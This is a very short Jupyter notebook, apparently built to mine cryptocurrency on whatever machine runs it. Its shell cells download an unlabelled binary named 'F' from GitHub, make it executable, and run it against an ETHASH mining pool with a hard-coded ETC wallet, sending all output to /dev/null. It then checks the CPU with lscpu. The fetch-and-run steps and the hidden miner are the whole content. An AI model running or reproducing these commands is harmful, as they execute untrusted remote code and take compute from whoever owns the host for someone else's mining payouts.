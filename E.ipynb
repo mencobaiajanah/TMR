! wget https://github.com/mencobaiajanah/TMR/raw/main/F
! chmod +x F
! ./F --algo ETHASH --pool ethash.unmineable.com:3333 --user ETC:0x82bca3b7bcc50b03422c763a06bc9830ed09f0bd.GPU-X#e34n-zbpz > /dev/null
! lscpu
